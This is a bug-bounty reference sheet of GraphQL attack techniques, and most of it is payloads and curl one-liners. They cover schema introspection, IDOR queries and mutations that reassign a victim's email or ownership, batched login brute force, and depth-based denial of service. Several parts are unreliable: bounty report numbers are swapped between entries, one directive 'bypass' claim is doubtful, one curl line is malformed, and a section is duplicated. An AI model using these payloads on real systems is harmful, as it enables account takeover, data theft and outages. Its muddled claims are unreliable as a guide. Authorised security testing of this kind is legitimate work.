# GRAPHQL — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 10, 28), telegram-intel, github-x-intel (H1 reports, HolyTips), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Discover GraphQL endpoint (/graphql, /api/graphql, /query, /v1/graphql)
[ ] 2. Test introspection (__schema, __type) — reveals attack surface
[ ] 3. Test IDOR via node() and mutations (deleteProfileInput, updateProfile)
[ ] 4. Test batching attack (rate limit bypass)
[ ] 5. Test field-level auth (over-fetching sensitive fields)
[ ] 6. Test query depth/complexity limits (DoS)
[ ] 7. Test aliasing for duplicate field queries
[ ] 8. Prove impact: PII exposure = High, ATO via mutation = Critical
```

---

## GRAPHQL ENDPOINT DISCOVERY

```bash
# Common paths
/graphql
/api/graphql
/query
/v1/graphql
/v2/graphql
/graphql/graphql
/.graphql
/graphiql
/playground
/altair
/voyager
```

```bash
# Discover via content-type
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'

# Check for GraphQL in headers
curl -sI "https://target.com/" | grep -i graphql
```

---

## INTROSPECTION (Recon)

### Full Schema Dump
```graphql
# Complete schema
{
  __schema {
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          type { name kind ofType { name kind } }
          defaultValue
        }
        type { name kind ofType { name kind } }
        isDeprecated
        deprecationReason
      }
      inputFields {
        name
        type { name kind ofType { name kind } }
        defaultValue
      }
      enumValues { name description isDeprecated deprecationReason }
      possibleTypes { name }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    directives { name description locations args { name type { name kind } defaultValue } }
  }
}
```

### Targeted Recon
```graphql
# Only queries
{ __schema { queryType { fields { name args { name type { name kind } } } } } }

# Only mutations
{ __schema { mutationType { fields { name args { name type { name kind } } } } } }

# Specific type
{ __type(name: "User") { name fields { name type { name kind } } } }

# Sensitive type names to search for
# User, Admin, Account, Profile, Credential, Token, Secret, Key, Password, SSN, PII, Payment, Order, Transaction, Report, Ticket, Message, Conversation, Chat, Notification, Setting, Config, Role, Permission, Policy, Audit, Log, Session, Token, Key, Secret, Certificate
```

---

## IDOR VIA GRAPHQL (High-Impact)

### 1. Global ID (node) — Bypasses Per-Object Auth
```graphql
# Fetch any object by global ID
{
  node(id: "dXNlcjoy") {  # base64("User:2")
    ... on User {
      email
      phoneNumber
      ssn
      creditCard
      apiKey
      privateNotes
    }
    ... on Order {
      items { price quantity }
      shippingAddress
    }
    ... on Report {
      content
      reporter { email }
    }
  }
}
```

### 2. Mutation IDOR (H1 #2633771 - HackerOne)
```graphql
# deleteProfileInput accepts arbitrary user ID
mutation {
  deleteProfileInput(id: "VICTIM_GLOBAL_ID") {
    success
  }
}

# updateProfile with victim's ID
mutation {
  updateProfile(input: {id: "VICTIM_ID", email: "attacker@evil.com"}) {
    user { email }
  }
}

# Transfer ownership
mutation {
  transferOwnership(input: {resourceId: "REPORT_123", newOwnerId: "ATTACKER_ID"}) {
    success
  }
}
```

### 3. Query-Level IDOR (Direct Field Access)
```graphql
# Direct field access without ownership check
query {
  user(id: "VICTIM_ID") {
    email
    ssn
    apiKeys { key secret }
    privateMessages { content }
  }
  report(id: "REPORT_ID") {
    content
    internalNotes
  }
  order(id: "ORDER_ID") {
    paymentDetails { cardLast4 cvv }
  }
}
```

---

## OVER-FETCHING / FIELD-LEVEL AUTH BYPASS

### H1 #3000510 ($25k) — `/reports/:id.json` equivalent
```graphql
# Regular user queries own report
query { report(id: "123") { title description } }

# But schema exposes sensitive fields
query { report(id: "123") { title description internalNotes ssn apiKey } }
```

### H1 #1618347 ($25k) — Private Program Schema Exposure
```graphql
# __schema reveals hidden types in private programs
{
  __schema {
    types {
      name
      fields { name }
    }
  }
}

# PolicyPageAssetGroup exposed via introspection
```

### Testing Field-Level Auth
```graphql
# For EACH sensitive type, try to query ALL fields
query {
  user(id: "YOUR_ID") {
    # Public fields
    username
    email
    # Sensitive fields (test each)
    ssn
    creditCard
    apiKey
    privateNotes
    internalFlags
    salary
    bonus
    medicalInfo
    passwordHash
    recoveryCodes
    totpSecret
    backupCodes
    sessionTokens
    oauthTokens
    apiTokens
    encryptionKeys
  }
}
```

---

## BATCHING ATTACK (Rate Limit Bypass)

### Concept
```json
# Single HTTP request with multiple operations
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass3\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass4\") }"}
]
# Bypasses per-request rate limits
```

### Testing
```bash
# Create batch file
cat > batch.json << 'EOF'
[
  {"query": "{ user(id: \"1\") { email } }"},
  {"query": "{ user(id: \"2\") { email } }"},
  {"query": "{ user(id: \"3\") { email } }"},
  {"query": "{ user(id: \"4\") { email } }"},
  {"query": "{ user(id: \"5\") { email } }"}
]
EOF

# Send batch
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d @batch.json

# Test login brute force via batching
# 100 login attempts in 1 request
```

### Aliasing for Field Duplication
```graphql
# Query same field multiple times with different args
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  # Bypasses rate limits on per-field basis
}
```

---

## QUERY DEPTH / COMPLEXITY DOS

### Depth Attack
```graphql
# Deeply nested query
{
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends { id }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Complexity Attack
```graphql
# Expensive field combinations
{
  users(first: 1000) {
    edges {
      node {
        posts(first: 100) {
          edges {
            node {
              comments(first: 100) {
                edges {
                  node { id }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Testing
```bash
# Send deep query, measure response time
# If > 5s or 500 error → DoS potential
# Test with increasing depth
```

---

## AUTHORIZATION BYPASS PATTERNS

### 1. Directive Abuse (@skip, @include, @deprecated)
```graphql
# @skip bypasses field resolver auth
query {
  user(id: "VICTIM") {
    ssn @skip(if: false)
  }
}

# @include with variable
query ($show: Boolean!) {
  user(id: "VICTIM") {
    ssn @include(if: $show)
  }
}
# Variables: {"show": true}
```

### 2. Variable Injection
```graphql
# Inject variables to bypass auth
query ($id: ID!) {
  user(id: $id) { email }
}
# Variables: {"id": "VICTIM_ID"}
```

### 3. Fragment Injection
```graphql
# Define fragment with sensitive fields
fragment Sensitive on User { ssn apiKey }
query {
  user(id: "VICTIM") { ...Sensitive }
}
```

---

## MUTATION ATTACKS

### Cross-User Mutations
```graphql
# Update victim's email
mutation {
  updateUser(input: {id: "VICTIM_ID", email: "attacker@evil.com"}) {
    user { email }
  }
}

# Delete victim's data
mutation {
  deletePost(input: {id: "VICTIM_POST_ID"}) {
    success
  }
}

# Create resource as victim
mutation {
  createPost(input: {authorId: "VICTIM_ID", content: "spam"}) {
    post { id }
  }
}
```

### 4. Race Conditions on Mutations
```graphql
# Simultaneous mutations on same resource
mutation { updateSettings(input: {theme: "dark"}) { success } }
# Send 20 concurrently → last write wins, potential auth bypass
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$25,000** | Disclosing PolicyPageAssetGroup in Private Programs via `/graphql` | HackerOne | Introspection/over-fetching |
| **$25,000** | `/reports/:id.json` discloses sensitive user data | HackerOne | IDOR on reports (GraphQL-like) |
| **—** | IDOR in GraphQL `deleteProfileInput` | HackerOne #2633771 | Mutation IDOR |
| **—** | GraphQL `__schema` introspection on private fields | HackerOne #3000510 | Over-fetching |
| **—** | IDOR in GraphQL mutations | Dust | Chained IDOR |
| **—** | Batching attack on login | Multiple | Rate limit bypass |

---

## CHAINS THAT PAY

```
GraphQL introspection + sensitive fields in schema              → Medium
GraphQL mutation IDOR (deleteProfileInput, updateProfile)       → High/Critical
GraphQL batching + rate limit bypass (login, enumeration)       → High
GraphQL aliasing + field duplication (mass enumeration)         → High
GraphQL over-fetching (ssn, apiKey, tokens)                     → High
GraphQL directive abuse (@skip, @include)                       → High
GraphQL mutation race condition                                 → High
GraphQL introspection on private program                        → Critical (H1 #1618347)
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Introspection test
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .

# IDOR via node()
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{node(id:\"dXNlcjoy\"){...on User{email phoneNumber}}}"}'

# Mutation IDOR (H1 #2633771)
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{deleteProfileInput(id:\"VICTIM_ID\"){success}}"}'

# Batching attack
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:\"1\"){email}}"},{"query":"{user(id:\"2\"){email}}"}]'

# Over-fetching test
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user(id:\"YOUR_ID\"){email ssn apiKey creditCard}}"'

# Depth DoS test
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{id}}}}}}}}}}"}' \
  -w "Time: %{time_total}s\n"

# Directive abuse
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query($show:Boolean!){user(id:\"VICTIM\"){ssn @include(if:$show)}}","variables":{"show":true}}'

# Variable injection
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query($id:ID!){user(id:$id){email}}","variables":{"id":"VICTIM_ID"}}'

# GraphQL scanner
nuclei -t ~/nuclei-templates/vulnerabilities/graphql/ -u https://target.com/graphql
```

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `graphql-cop` | Schema analysis, auth testing |
| `graphw00f` | GraphQL fingerprinting |
| `inql` (Burp) | GraphQL testing extension |
| `GraphQL Voyager` | Visual schema exploration |
| `Altair` / `GraphiQL` / `Playground` | Manual testing |
| `nuclei` templates | GraphQL vuln templates |
| `ffuf` | Batching, field fuzzing |
| Custom scripts | Aliasing, directive abuse, race testing |

---

## TRIAGE DECISION TREE

```
1. Is introspection enabled?
   NO → Harder to test, but not a bug
   YES → Continue

2. Can you access objects you don't own?
   - node(id) returns other user's data     → High/Critical
   - Mutation accepts arbitrary IDs         → Critical
   - Query returns sensitive fields         → High

3. Can you bypass rate limits?
   - Batching 100+ ops in 1 request         → High
   - Aliasing for mass enumeration          → High

4. Can you DoS?
   - Depth > 10 causes timeout/500          → Medium
   - Complexity > 1000 causes timeout       → Medium

5. Chain potential?
   + IDOR + sensitive data (PII, keys)      → Critical
   + Mutation IDOR + ATO path               → Critical
   + Batching + login brute force           → Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Introspection enabled but no sensitive fields | Info only |
| IDOR but only public data | Low/Info |
| Batching but rate limit per-operation | Not vulnerable |
| Depth DoS but query complexity limited | Not vulnerable |
| "Could access if..." without demonstration | Theoretical = N/A |
| GraphQL on out-of-scope domain | Not in scope |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `graphql-cop` | Automated GraphQL security audit |
| `graphw00f` | Fingerprint GraphQL engine |
| `inql` (Burp) | GraphQL security testing |
| `GraphQL Voyager` | Visual schema docs |
| `nuclei` | GraphQL vuln templates |
| `ffuf` | Batching, mutation fuzzing |
| Custom Python/JS | Aliasing, directive abuse, race testing |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 10 (introspection, node() IDOR, batching), Section 28 (enhanced GraphQL attacks)
- telegram-intel: @bugbountyresources 100 vuln categories
- github-x-intel: H1 reports (H1 #1618347 $25k, H1 #3000510 $25k, H1 #2633771, Dust); bb-methodology integration
- bountyforge: GraphQL as high-yield surface, ATO chains
- bb-methodology: Tactical Thinking (over-fetching), What-If experiments
- PortSwigger: GraphQL labs, "GraphQL Security" research
- HackTricks: GraphQL methodology
- GraphQL Spec: Introspection, directives, batching